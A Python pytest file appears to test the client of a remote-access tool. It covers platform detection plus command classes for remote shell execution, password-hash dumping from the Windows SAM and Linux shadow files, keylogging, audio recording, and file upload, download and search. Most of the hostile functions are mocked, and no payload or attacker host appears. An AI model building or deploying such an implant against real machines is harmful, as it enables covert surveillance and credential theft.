import base64
import os
import platform
import tempfile
from pathlib import Path
from typing import Any, Dict
from unittest.mock import MagicMock, mock_open, patch

import pytest

from client.commands.download import DownloadCommand
from client.commands.hashdump import HashdumpCommand
from client.commands.help import HelpCommand
from client.commands.ipconfig import IpconfigCommand
from client.commands.keylogger import KeyloggerCommand
from client.commands.record_audio import RecordAudioCommand
from client.commands.search import SearchCommand
from client.commands.shell import ShellCommand, get_shell_command
from client.commands.upload import UploadCommand
from common.platform import (
    get_env_separator,
    get_home_directory,
    get_line_ending,
    get_os_type,
    get_path_separator,
    get_shell_command as get_platform_shell_command,
    get_temp_directory,
    is_linux,
    is_macos,
    is_windows,
    join_path,
    normalize_path,
)


class TestPlatformDetection:
    @pytest.mark.parametrize("platform_name,expected", [
        ("win32", "windows"),
        ("win64", "windows"),
        ("linux", "linux"),
        ("linux2", "linux"),
        ("darwin", "darwin"),
    ])
    def test_get_os_type_parametrized(
        self, platform_name: str, expected: str, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr("sys.platform", platform_name)
        result = get_os_type()
        assert result == expected

    def test_is_windows_consistency(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr("sys.platform", "win32")
        assert is_windows() is True
        assert is_linux() is False
        assert is_macos() is False

    def test_is_linux_consistency(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr("sys.platform", "linux")
        assert is_windows() is False
        assert is_linux() is True
        assert is_macos() is False

    def test_is_macos_consistency(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr("sys.platform", "darwin")
        assert is_windows() is False
        assert is_linux() is False
        assert is_macos() is True


class TestPlatformSpecificPaths:
    def test_path_separator_windows(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import os
        monkeypatch.setattr(os, "sep", "\\")
        assert get_path_separator() == "\\"

    def test_path_separator_unix(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import os
        monkeypatch.setattr(os, "sep", "/")
        assert get_path_separator() == "/"

    def test_env_separator_windows(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import os
        monkeypatch.setattr(os, "pathsep", ";")
        assert get_env_separator() == ";"

    def test_env_separator_unix(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import os
        monkeypatch.setattr(os, "pathsep", ":")
        assert get_env_separator() == ":"

    def test_line_ending_windows(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr("sys.platform", "win32")
        assert get_line_ending() == "\r\n"

    def test_line_ending_unix(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr("sys.platform", "linux")
        assert get_line_ending() == "\n"

    def test_temp_directory_exists(self) -> None:
        temp = get_temp_directory()
        assert os.path.isdir(temp)

    def test_home_directory_exists(self) -> None:
        home = get_home_directory()
        assert isinstance(home, str)
        assert len(home) > 0


class TestShellCommandPlatform:
    @pytest.mark.parametrize("os_type,expected_shell", [
        ("windows", "cmd.exe"),
        ("linux", "/bin/bash"),
        ("darwin", "/bin/bash"),
    ])
    def test_shell_command_by_platform(
        self, os_type: str, expected_shell: str, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        if os_type == "windows":
            monkeypatch.setattr(platform, "system", lambda: "Windows")
        elif os_type == "linux":
            monkeypatch.setattr(platform, "system", lambda: "Linux")
        else:
            monkeypatch.setattr(platform, "system", lambda: "Darwin")

        result = get_shell_command()
        assert result == expected_shell

    def test_shell_command_execution_windows(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(platform, "system", lambda: "Windows")

        mock_result = MagicMock()
        mock_result.stdout = b"test output"
        mock_result.stderr = b""
        mock_result.returncode = 0

        with patch("client.commands.shell.subprocess.run", return_value=mock_result) as mock_run:
            command = ShellCommand()
            result = command.execute({"command": "echo test"})

            assert result["success"] is True
            assert result["shell"] == "cmd.exe"
            mock_run.assert_called_once()

    def test_shell_command_execution_linux(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(platform, "system", lambda: "Linux")

        command = ShellCommand()
        result = command.execute({"command": "echo test"})

        assert result["success"] is True
        assert result["shell"] == "/bin/bash"


class TestHashdumpCommandPlatform:
    def setup_method(self) -> None:
        self.command = HashdumpCommand()

    @patch("platform.system")
    def test_hashdump_windows_path(self, mock_system: MagicMock) -> None:
        mock_system.return_value = "Windows"

        with patch.object(self.command, "_is_windows_admin", return_value=True):
            with patch.object(self.command, "_extract_windows_sam") as mock_extract:
                mock_extract.return_value = {
                    "success": True,
                    "os": "windows",
                    "hashes": [],
                    "count": 0,
                    "message": "Extracted 0 hashes",
                }

                result = self.command.execute({})

                assert result["success"] is True
                assert result["os"] == "windows"

    @patch("platform.system")
    def test_hashdump_linux_path(self, mock_system: MagicMock) -> None:
        mock_system.return_value = "Linux"

        with patch.object(self.command, "_is_linux_root", return_value=True):
            with patch.object(self.command, "_extract_linux_shadow") as mock_extract:
                mock_extract.return_value = {
                    "success": True,
                    "os": "linux",
                    "hashes": [],
                    "count": 0,
                    "message": "Extracted 0 hashes",
                }

                result = self.command.execute({})

                assert result["success"] is True
                assert result["os"] == "linux"

    @patch("platform.system")
    def test_hashdump_unsupported_os(self, mock_system: MagicMock) -> None:
        mock_system.return_value = "Darwin"

        result = self.command.execute({})

        assert result["success"] is False
        assert "Unsupported" in result["error"]


class TestIpconfigCommandPlatform:
    @patch("client.commands.ipconfig.netifaces")
    def test_ipconfig_works_on_all_platforms(
        self, mock_netifaces: MagicMock
    ) -> None:
        mock_netifaces.interfaces.return_value = ["eth0"]
        mock_netifaces.ifaddresses.return_value = {
            2: [{"addr": "192.168.1.1", "netmask": "255.255.255.0"}]
        }
        mock_netifaces.gateways.return_value = {}
        mock_netifaces.AF_INET = 2
        mock_netifaces.AF_INET6 = 10

        command = IpconfigCommand()
        result = command.execute({})

        assert result["success"] is True
        assert "interfaces" in result

    @patch("client.commands.ipconfig.netifaces")
    def test_ipconfig_mac_address_linux_af_packet(
        self, mock_netifaces: MagicMock
    ) -> None:
        mock_netifaces.interfaces.return_value = ["eth0"]
        mock_netifaces.ifaddresses.return_value = {
            17: [{"addr": "00:11:22:33:44:55"}]
        }
        mock_netifaces.gateways.return_value = {}

        command = IpconfigCommand()
        result = command.execute({})

        assert result["success"] is True
        assert result["interfaces"][0]["mac_address"] == "00:11:22:33:44:55"

    @patch("client.commands.ipconfig.netifaces")
    def test_ipconfig_mac_address_macos_af_link(
        self, mock_netifaces: MagicMock
    ) -> None:
        mock_netifaces.interfaces.return_value = ["en0"]
        mock_netifaces.ifaddresses.return_value = {
            18: [{"addr": "aa:bb:cc:dd:ee:ff"}]
        }
        mock_netifaces.gateways.return_value = {}

        command = IpconfigCommand()
        result = command.execute({})

        assert result["success"] is True
        assert result["interfaces"][0]["mac_address"] == "aa:bb:cc:dd:ee:ff"


class TestFileCommandsPlatform:
    def test_download_path_normalization(self) -> None:
        command = DownloadCommand()

        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("test content")
            temp_path = f.name

        try:
            result = command.execute({"remote_path": temp_path})

            assert result["success"] is True
            normalized = normalize_path(temp_path)
            assert result["remote_path"] == normalized
        finally:
            os.unlink(temp_path)

    def test_upload_path_normalization(self) -> None:
        command = UploadCommand()
        content = base64.b64encode(b"test").decode("utf-8")

        with tempfile.TemporaryDirectory() as tmpdir:
            temp_path = join_path(tmpdir, "test.txt")

            result = command.execute({
                "remote_path": temp_path,
                "content": content
            })

            assert result["success"] is True
            normalized = normalize_path(temp_path)
            assert result["remote_path"] == normalized

    def test_search_path_handling(self) -> None:
        command = SearchCommand()

        with tempfile.TemporaryDirectory() as tmpdir:
            test_file = Path(tmpdir) / "test.txt"
            test_file.write_text("content")

            result = command.execute({
                "pattern": "*.txt",
                "directory": tmpdir,
            })

            assert result["success"] is True
            assert result["count"] == 1


class TestHelpCommandPlatform:
    def test_help_works_on_all_platforms(self) -> None:
        command = HelpCommand()
        result = command.execute({})

        assert "commands" in result
        assert len(result["commands"]) > 0


class TestKeyloggerCommandPlatform:
    def setup_method(self) -> None:
        KeyloggerCommand._instance = None
        self.command = KeyloggerCommand()

    def teardown_method(self) -> None:
        if self.command._running:
            self.command._stop()

    @patch("client.commands.keylogger.keyboard.Listener")
    def test_keylogger_start_stop_all_platforms(
        self, mock_listener: MagicMock
    ) -> None:
        mock_listener_instance = MagicMock()
        mock_listener.return_value = mock_listener_instance

        start_result = self.command.execute({"action": "start"})
        assert start_result["success"] is True
        assert start_result["status"] == "started"

        stop_result = self.command.execute({"action": "stop"})
        assert stop_result["success"] is True
        assert stop_result["status"] == "stopped"


class TestRecordAudioCommandPlatform:
    def setup_method(self) -> None:
        RecordAudioCommand._instance = None
        self.command = RecordAudioCommand()

    def test_record_audio_unavailable_graceful(self) -> None:
        with patch("client.commands.record_audio.PYAUDIO_AVAILABLE", False):
            result = self.command.execute({"action": "start"})

            assert result["success"] is False
            assert "PyAudio" in result["error"]


class TestJoinPathPlatform:
    def test_join_path_two_parts(self) -> None:
        result = join_path("foo", "bar")
        assert "foo" in result
        assert "bar" in result

    def test_join_path_multiple_parts(self) -> None:
        result = join_path("a", "b", "c", "d")
        assert "a" in result
        assert "b" in result
        assert "c" in result
        assert "d" in result


class TestNormalizePathPlatform:
    @pytest.mark.parametrize("input_path", [
        "foo/bar",
        "foo\\bar",
        "./foo/bar",
        "../foo/bar",
    ])
    def test_normalize_path_various_inputs(self, input_path: str) -> None:
        result = normalize_path(input_path)
        assert isinstance(result, str)

    def test_normalize_path_empty(self) -> None:
        result = normalize_path("")
        assert result in ("", ".")


class TestCommandExecutionAllPlatforms:
    @pytest.mark.parametrize("command_class", [
        HelpCommand,
        SearchCommand,
        DownloadCommand,
        UploadCommand,
        ShellCommand,
        IpconfigCommand,
    ])
    def test_command_instantiation_platform_independent(
        self, command_class: type
    ) -> None:
        command = command_class()
        assert hasattr(command, "name")
        assert hasattr(command, "description")
        assert hasattr(command, "execute")


class TestPlatformUtilityFunctions:
    def test_get_platform_shell_command(self) -> None:
        result = get_platform_shell_command()
        assert isinstance(result, str)
        assert len(result) > 0

    def test_get_temp_directory(self) -> None:
        result = get_temp_directory()
        assert isinstance(result, str)
        assert len(result) > 0
        assert os.path.isdir(result)

    def test_get_home_directory(self) -> None:
        result = get_home_directory()
        assert isinstance(result, str)
        assert len(result) > 0
